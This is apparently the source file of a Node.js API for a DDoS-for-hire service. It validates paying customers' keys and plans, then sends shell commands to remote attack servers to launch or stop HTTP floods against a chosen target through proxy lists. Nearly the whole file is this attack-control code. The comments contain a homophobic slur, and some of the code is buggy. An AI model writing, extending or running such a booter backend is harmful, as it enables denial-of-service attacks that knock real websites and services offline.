//for Solar API - Created by Skiop
//remove credits if gay.

const express = require('express');
const net = require('net');
const mysql = require('mysql');

const blackList = ['\'', '"', '[', ']', '{', '}', '(', ')', ';', '|', '&', '%', '#', '@', '`', '´'];

const app = express();
app.use(express.json());

//servers
const servers = {
    "7": {
        "1": {
            "name": "penis",
            "host": "iphere",
            "port": 3000,
            "slots": 2
        }
    },
    "4": {
        "1": {
            "name": "penis",
            "host": "iphere",
            "port": 3000,
            "slots": 3
        }
    }
};

//methods
const commands = {
    "HTTP-STORM": {
        "command": "screen -dmS attack_${attack_id} ./gay GET ${host} ${time} 2 24 ALL_proxies.txt",
        "vip": true // set as needed
    }
}

//settings
const socket_token = "sadfasdfasfd";
const api_port = 13336;

const pool = mysql.createPool({
    connectionLimit: 10,
    host: 'localhost',
    user: 'proxy',
    password: 'proxy',
    database: 'juanito'
});

blacklist = ['google.com']; 


function containsBlacklisted(target, blacklist) {
    target = target.toLowerCase();

    for (const item of blacklist) {
        if (target.includes(item.toLowerCase())) {
            return true;
        }
    }

    return false;
}


function queryDatabase(query, params) {
    return new Promise((resolve, reject) => {
        pool.getConnection((err, connection) => {
            if (err) {
                reject(err);
                return;
            }

            connection.query(query, params, (error, results) => {
                connection.release();
                if (error) {
                    reject(error);
                } else {
                    resolve(results);
                }
            });
        });
    });
}

app.get(`/api/attack`, async (req, res) => {
    const attack_id = Math.floor((Math.random() * 125000));

    const field = {
        host: req.query.host || undefined,
        time: req.query.time || undefined,
        port: req.query.port || 53,
        method: req.query.method || undefined,
        apikey: req.query.key || undefined,
        subnet: req.query.subnet || 32,
        request_rate: req.query.request_rate || 32,
        request_method: req.query.request_method || 'GET',
        geolocation: req.query.geolocation || 'ALL'
        //can add more but i do advice you check them against remove code execute :)
    };
    //user key validation
    if (!field.apikey || blackList.some(char => field.apikey.includes(char))) return res.json({ status: 401, message: `invalid api key` });
    const [{ 'COUNT(*)': key }] = await queryDatabase('SELECT COUNT(*) FROM `users` WHERE apikey = ?', [field.apikey]);
    if (key === 0) return res.json({ status: 401, message: `invalid api key` });

    //normal checks
    if (blackList.some(char => field.host.includes(char))) return res.json({ status: 400, message: `host is invalid` })
    if (containsBlacklisted(field.host, blacklist)) return res.json({ status: 400, message: `host is blacklisted` })
    if (!field.time || isNaN(field.time) || field.time < 1 || field.time > 86400) return res.json({ status: 400, message: `invalid time` });
    if (!field.method || !Object.keys(commands).includes(field.method.toUpperCase())) return res.json({ status: 400, message: `invalid method` });

    //layer4 checks
    if (!field.port || isNaN(field.port) || field.port < 0 || field.port > 65535) return res.json({ status: 400, message: `port is invalid` })
    if (!field.subnet || isNaN(field.subnet) || field.subnet > 32 || field.subnet < 24) return res.json({ status: 400, message: `subnet is invalid` });

    //layer7 checks
    if (!field.request_rate || isNaN(field.request_rate) || field.request_rate < 1 || field.request_rate > 512) return res.json({ status: 400, message: `invalid request_rate` });
    if (!field.request_method || !['GET', 'POST'].includes(field.request_method.toUpperCase()) || blackList.some(char => field.request_method.includes(char))) return res.json({ status: 400, message: `invalid request_method` });
    if (!field.geolocation || blackList.some(char => field.geolocation.includes(char)) || !['ALL', 'CN'].includes(field.geolocation.toUpperCase())) return res.json({ status: 400, message: `invalid geolocation` });


    let layer;
    if (net.isIPv4(field.host)) {
        layer = '4';
    } else {
        try {
            new URL(field.host);
            layer = '7';
        } catch (error) {
            return res.json({
                status: 400,
                message: 'host is invalid'
            });
        }
    }
    //getting user information
    const [{ 'concurrents': concurrents, 'maxtime': maxtime, 'vip': vip, 'bypass_power': bypass_power, 'expire_date': expire_date, 'status': status }] = await queryDatabase('SELECT concurrents, status, maxtime, expire_date, vip, bypass_power FROM users WHERE apikey = ?', [field.apikey]);
    const [{ 'COUNT(*)': user_ongoing }] = await queryDatabase("SELECT COUNT(*) from attacks WHERE duration + date_sent > UNIX_TIMESTAMP() AND user_key = ?", [field.apikey]);
    //validating user information
    if (status !== 1) return res.json({ stauts: 400, message: `key is disabled` });
    if (commands[field.method.toUpperCase()].vip && vip !== 1) return res.json({ status: 400, message: `vip required for this` });
    if (user_ongoing >= concurrents) return res.json({ status: 400, message: `max concurrents reached` });
    if (field.time > maxtime) return res.json({ status: 400, message: `max time exceeded` });
    if (Math.floor(Date.now() / 1000) > expire_date) return res.json({ status: 400, message: `plan is expired` });


    try {

        const availableServers = [];

        for (const serverId in servers[layer]) {
            const server = servers[layer][serverId]; 

            const [{ 'COUNT(*)': running }] = await queryDatabase('SELECT COUNT(*) FROM `attacks` WHERE `duration` + `date_sent` > UNIX_TIMESTAMP() AND `stopped` = 0 AND `server` = ?', [serverId]);

            if (running < server.slots) {
                availableServers.push({ id: serverId, ...server });
            }
        }


        if (availableServers.length === 0) {
            return res.json({ status: 500, data: `no available servers, please try again later` });
        }

        const command = commands[field.method.toUpperCase()].command
            .replace('${attack_id}', attack_id)
            //.replace('${host}', Buffer.from(field.host,'utf-8).toString('base64')) you can remove blacklist checks when using this
            .replace('${host}', field.host)
            .replace('${time}', field.time);

        const data = {
            socket_token: socket_token,
            command: command
        };
        console.log(command, availableServers[0].id)
        const encodedData = Buffer.from(JSON.stringify(data)).toString('base64');

        const startTime = process.hrtime();

        const response = await sendData(availableServers[0].id, encodedData, layer);

        if (!response.includes("success")) {
            await queryDatabase('UPDATE `attacks` SET `stopped` = 1 WHERE `attack_id` = ?', [attack_id]);

            return res.json({
                status: 500,
                message: 'failed to start attack',
            });
        }

        const elapsedTime = process.hrtime(startTime);
        const elapsedTimeMs = elapsedTime[0] * 1000 + elapsedTime[1] / 1000000;

        await queryDatabase("INSERT INTO `attacks` VALUES(NULL, ?, ?, ?, ?, UNIX_TIMESTAMP(), 0, ?,?)", [availableServers[0].id, field.host, field.time, field.method, attack_id, field.apikey]);

        return res.json({
            status: 200,
            message: 'attack started successfully',
            id: attack_id,
            elapsed_time: elapsedTimeMs.toFixed(2) + "ms",
            data: {
                host: field.host,
                time: field.time,
                method: field.method
            }
        });
    } catch (e) {
        await queryDatabase('UPDATE `attacks` SET `stopped` = 1 WHERE `attack_id` = ?', [attack_id]);
        console.log(e)
        return res.json({
            status: 200,
            message: 'failed to start attack',
        });
    }

});

app.get(`/api/stop/:id`, async (req, res) => {

    const field = {
        attack_id: req.params['id'] || undefined,
        apikey: req.query.key || undefined,
    };

    if (!field.apikey || blackList.some(char => field.apikey.includes(char))) return res.json({ status: 400, message: `api key is invalid` });

    const [{ 'COUNT(*)': key }] = await queryDatabase("SELECT COUNT(*) FROM users WHERE apikey = ?", [field.apikey]);
    if (key === 0) return res.json({ status: 400, message: `api key is invalid` });
    const [{ 'expire_date': expire_date, 'status': status }] = await queryDatabase("SELECT expire_date,status FROM users WHERE apikey = ?", [field.apikey]);
    if (expire_date < Math.floor(Date.now / 1000)) return res.json({ status: 400, message: `key is expired` });
    if (status !== 1) return res.json({ status: 400, message: `key is disabled` });



    if (!field.attack_id || isNaN(field.attack_id)) return res.json({ status: 500, data: `invalid attack id` });

    try {

        var server = await queryDatabase('SELECT `server` FROM `attacks` WHERE `attack_id` = ? AND user_key = ?', [field.attack_id, field.apikey]);

        if (!server || server.length === 0) return res.json({ status: 400, message: `attack was not found or this attack is not yours` });

        const data = { socket_token: socket_token, command: `screen -dm pkill -f ${field.attack_id}` };

        const encodedData = Buffer.from(JSON.stringify(data)).toString('base64');

        const startTime = process.hrtime();

        const response = await sendData(server[0].server, encodedData);

        if (!response.includes("success")) {
            return res.json({
                status: 500,
                message: 'failed to stop attack',
            });
        }

        const elapsedTime = process.hrtime(startTime);
        const elapsedTimeMs = elapsedTime[0] * 1000 + elapsedTime[1] / 1000000;

        await queryDatabase('UPDATE `attacks` SET `stopped` = 1 WHERE `attack_id` = ?', [field.attack_id]);

        return res.json({
            status: 200,
            message: 'attack stopped successfully',
            id: field.attack_id,
            elapsed_time: elapsedTimeMs.toFixed(2) + "ms"
        });

    } catch (e) {

        return res.json({
            status: 200,
            message: 'failed to stop attack',
        });
    }

});


app.get('/api/status', async (req, res) => {
    const field = {
        apikey: req.query.key || undefined
    };

    const [{ 'COUNT(*)': key }] = await queryDatabase("SELECT COUNT(*) FROM users WHERE apikey = ?", [field.apikey]);
    if (key === 0) return res.json({ status: 400, message: `api key is invalid` });
    const [{ 'expire_date': expire_date, 'status': status, 'concurrents': slots }] = await queryDatabase("SELECT expire_date,status,concurrents FROM users WHERE apikey = ?", [field.apikey]);
    if (expire_date < Math.floor(Date.now / 1000)) return res.json({ status: 400, message: `key is expired` });
    if (status !== 1) return res.json({ status: 400, message: `key is disabled` });


    try {

        var activeServers = await queryDatabase('SELECT DISTINCT `server` FROM `attacks` WHERE `duration` + `date_sent` > UNIX_TIMESTAMP() AND `stopped` = 0');

        const [{ 'COUNT(*)': runnings }] = await queryDatabase('SELECT COUNT(*) FROM `attacks` WHERE `duration` + `date_sent` > UNIX_TIMESTAMP() AND `stopped` = 0');
        const [{ 'COUNT(*)': yrunning }] = await queryDatabase('SELECT COUNT(*) FROM `attacks` WHERE `duration` + `date_sent` > UNIX_TIMESTAMP() AND `stopped` = 0 AND user_key = ?', [field.apikey]);
        let totalSlots = 0;

        for (const serverId in servers['4']) {
            if (servers['4'].hasOwnProperty(serverId)) {
                const slots = servers['4'][serverId].slots;
                totalSlots += slots;
            }
        }

        for (const serverId in servers['7']) {
            if (servers['7'].hasOwnProperty(serverId)) {
                const slots = servers['7'][serverId].slots;
                totalSlots += slots;
            }
        }

        var responseObject = {
            status: 200,
            message: 'successfully got attack information',
            network: {
                slots: totalSlots,
                ongoing: runnings
            },
            account: {
                slots: slots,
                ongoing: yrunning
            },
            your_attacks: {}
        };

        for (var i = 0; i < activeServers.length; i++) {

            var server = activeServers[i].server;

            var attacksData = await queryDatabase('SELECT target, method, attack_id, date_sent + duration - UNIX_TIMESTAMP() AS expires FROM `attacks` WHERE `duration` + `date_sent` > UNIX_TIMESTAMP() AND `stopped` = 0 AND `server` = ? AND user_key = ?', [server, field.apikey]);

            var attacks = attacksData.map(attack => {
                return {
                    target: attack.target,
                    method: attack.method,
                    attack_id: attack.attack_id,
                    expires: attack.expires
                };
            });

            var [{ 'COUNT(*)': running }] = await queryDatabase('SELECT COUNT(*) FROM `attacks` WHERE `duration` + `date_sent` > UNIX_TIMESTAMP() AND `stopped` = 0 AND `server` = ? AND user_key = ?', [server, field.apikey]);

            responseObject.your_attacks[server] = {
                attacks: attacks,
                usedSlots: running
            };

        }

        return res.json(responseObject);

    } catch (e) {
        console.log(e)
        return res.json({
            status: 200,
            message: 'failed to get information',
        });
    }

});


app.listen(api_port, () => console.log(`Layer7 Socket API started on port ${api_port}`));

function sendData(serverId, data, layer) {
    return new Promise((resolve, reject) => {
        const server = servers[layer][serverId];
        console.log(server, layer)
        if (server) {
            const socket = new net.Socket();

            socket.connect(server.port, server.host, () => {
                socket.write(data);
            });

            socket.on('data', (result) => {
                const response = result.toString();
                socket.destroy();
                resolve(response);
            });

            socket.on('error', (err) => {
                socket.destroy();
                reject('error');
                console.log(err)
            });
        } else {
            reject('error');
        }
    });
}
